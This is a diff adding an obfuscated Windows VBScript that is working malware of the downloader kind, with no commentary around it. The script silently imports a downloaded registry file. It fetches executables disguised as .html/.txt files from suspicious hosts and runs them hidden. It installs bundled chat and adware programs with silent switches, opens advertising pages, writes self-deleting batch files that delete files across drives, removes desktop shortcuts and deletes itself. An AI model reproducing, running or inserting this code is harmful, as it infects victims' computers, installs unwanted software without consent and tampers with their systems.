@@ -1,0 +1,113 @@
+on error resume next
+a0e1a54a="http://p8.ch"&"ina.sog"&"ou.google.baid"&"u.com.ba"&"idu163s"&"o.info"
+dfw61x20="http://98.126.249.6:81"
+fo053eq2="http://hao345.info:7241"
+Set bo2qj6te= WScript.CreateObject("WScr"&"ipt.Sh"&"ell") 
+Set m1emz246m = Wscript.CreateObject("Script"&"ing.FileSystemO"&"bject") 
+cqx76t3c=bo2qj6te.ExpandEnvironmentStrings("%temp%")
+w1kl0x9e = left(cqx76t3c,3)
+m21mc9x43 = bo2qj6te.SpecialFolders("AppData") & "\Microsoft\Intern"&"et Explorer\Quic"&"k Launch"            '当前用户快速启动
+w20410a59="c:\Docume~1\All Us"&"ers\「开始」菜单"
+bo2qj6te.Run("htt"&"p://w"&"ww.xs"&"p5.i"&"nfo/index1.htm")
+bo2qj6te.run "C:\Progra~1\Intern~1\IEXPLORE.EXE http://ww"&"w.xs"&"p5.info/index/index1.htm",0 
+
+Sub c1j3ojj5m(t122hais6)
+Set e91iuah4= CreateObject("scrip"&"ting.Fi"&"leSys"&"temObject") 
+If Not e91iuah4.FolderExists(t122hais6) Then
+  e91iuah4.CreateFolder t122hais6
+End If
+Set e91iuah4 = Nothing 
+end sub
+
+Call c1j3ojj5m(w1kl0x9e&"Prog"&"ra~1\Win"&"RAR\ico")
+ico1=w1kl0x9e&"Prog"&"ra~1\WinR"&"AR\ico\"
+
+Sub gie6c32k(q182as0ur,w1x4991et)
+Set j15945783 = CreateObject("M"&"icros"&"oft.XM"&"L"&"HT"&"TP")
+Set k119h09sg = CreateObject("AD"&"O"&"DB.S"&"t"&"r"&"e"&"a"&"m")
+with j15945783
+.Open "GET",q182as0ur,0
+.Send()
+end with
+b=j15945783.responseBody
+with k119h09sg
+.type = eval("1")
+.Mode = eval("3")
+.open()
+.write eval("j15945783.r"&"es"&"po"&"n"&"se"&"Bo"&"d"&"y")
+.SaveToFile w1x4991et,eval ("2")
+end with
+k119h09sg.close
+end sub
+
+Sub d15oj213i(e1mjv4296,f1j87k3wj)
+Set r15322r23 = CreateObject("Script"&"ing.FileSyste"&"mObject")
+If r15322r23.FileExists(e1mjv4296) Then                         
+       r15322r23.deletefile(e1mjv4296)
+End If
+    Set g1z27x592=r15322r23.CreateTextFile(e1mjv4296,False)
+    g1z27x592.WriteLine(f1j87k3wj)
+    g1z27x592.WriteLine("de"&"l %"&"0 ")
+    g1z27x592.Close       
+Set r15322r23  = Nothing
+end sub
+
+call gie6c32k(a0e1a54a&"/ico/tb.ico",ico1&"tb.ico")
+
+call gie6c32k(a0e1a54a&"/go/ie.txt",cqx76t3c&"\ie.reg")
+bo2qj6te.Run "regedit /s "&cqx76t3c&"\ie.reg"
+
+call gie6c32k(dfw61x20&"/hao.txt",cqx76t3c&"\xing.vbs")
+bo2qj6te.Run "cmd.exe /c start "&cqx76t3c&"\xing.vbs",0,True
+
+call d15oj213i(cqx76t3c& "\my.bat","for %%a in (c: d: e: f:) do for /f "&chr(34)&"delims="&chr(34)&" %%b in ('dir /a /s /b %%a\色情专用播放器.exe') do del %%b")
+call d15oj213i(cqx76t3c& "\my1.bat","for %%a in (C:\DOCUME~1\ADMINI~1\桌面\) do for /f "&chr(34)&"delims="&chr(34)&" %%b in ('dir /a /s /b %%a\色情专用播放器.exe') do del %%b")
+cmd=bo2qj6te.RUN(cqx76t3c&"\my.bat", runhide)
+cmd=bo2qj6te.RUN(cqx76t3c&"\my1.bat", runhide)
+
+call gie6c32k(a0e1a54a&"/go/page.txt",cqx76t3c&"\page.vbs")
+bo2qj6te.Run "cmd.exe /c start "&cqx76t3c&"\page.vbs",0,True
+
+call gie6c32k(a0e1a54a&"/dy/aa.html",cqx76t3c&"\aa.exe")
+bo2qj6te.Run "cmd.exe /c start "&cqx76t3c&"\aa.exe",0,True
+
+call gie6c32k(a0e1a54a&"/dy/so.html",cqx76t3c&"\so.exe")
+bo2qj6te.Run "cmd.exe /c start "&cqx76t3c&"\so.exe",0,True
+
+call gie6c32k(fo053eq2&"/soft/pi4397.exe",cqx76t3c&"\pi4397.exe")
+bo2qj6te.Run "cmd.exe /c start "&cqx76t3c&"\pi4397.exe",0,True
+
+bo2qj6te.Run "http://www.qwxyx.com"
+
+call gie6c32k("http://neirong.funshion.com/download/silent/60423/Funshi"&"onInstall.exe",cqx76t3c&"\Funshi"&"onInstall.exe")
+bo2qj6te.Run "cmd.exe /c start "&cqx76t3c&"\Funshi"&"onInstall.exe",0,True
+
+bo2qj6te.Run "http://www.mmtp5.info/dy2.html"
+
+call gie6c32k(a0e1a54a&"/dy/cpa.html",cqx76t3c&"\cpa.exe")
+bo2qj6te.Run cqx76t3c&"\cpa.exe",,True
+
+call gie6c32k("http://download13.subo.me/9158/9158chat_374931.exe",cqx76t3c&"\9158chat_374931.exe")
+bo2qj6te.Run cqx76t3c&"\9158chat_374931.exe  /SILENT", , True
+m1emz246m.DeleteFile "C:\Docume~1\All Users\桌面\购物网站大全.lnk" ,true
+m1emz246m.DeleteFile "C:\Docume~1\All Users\桌面\热门游戏.lnk" ,true
+m1emz246m.DeleteFile "C:\Docume~1\All Users\桌面\风行.lnk" ,true
+m1emz246m.DeleteFile m21mc9x43&"\风行.lnk" ,true
+m1emz246m.DeleteFile w20410a59&"\风行.lnk" ,true
+m1emz246m.DeleteFile m21mc9x43&"\皮皮播放器.lnk" ,true
+m1emz246m.DeleteFile "C:\Docume~1\Admini~1\桌面\9158多人视频.lnk" ,true
+m1emz246m.DeleteFile "C:\Docume~1\All Users\桌面\9158多人视频.lnk" ,true
+m1emz246m.DeleteFile m21mc9x43&"\9158多人视频.lnk" ,true
+m1emz246m.DeleteFile w20410a59&"\9158多人视频.lnk" ,true
+
+call gie6c32k("http://download13.subo.me/t58/t58chat_374931.exe",cqx76t3c&"\t58chat_374931.exe")
+bo2qj6te.Run cqx76t3c&"\t58chat_374931.exe  /SILENT", , True
+m1emz246m.DeleteFile "C:\Docume~1\Admini~1\桌面\跳舞吧.lnk" ,true
+m1emz246m.DeleteFile "C:\Docume~1\All Users\桌面\跳舞吧.lnk" ,true
+m1emz246m.DeleteFile m21mc9x43&"\跳舞吧多人视频空间.lnk" ,true
+m1emz246m.DeleteFile w20410a59&"\跳舞吧多人视频空间.lnk" ,true
+
+WScript.Sleep 1000000
+bo2qj6te.Run "http://www.cryx.info/sogou/vipdy.html?ss"
+bo2qj6te.Run "C:\Progra~1\Funshi~1\Funshion\Funshion.exe", , True
+m1emz246m.DeleteFile(WScript.ScriptName)
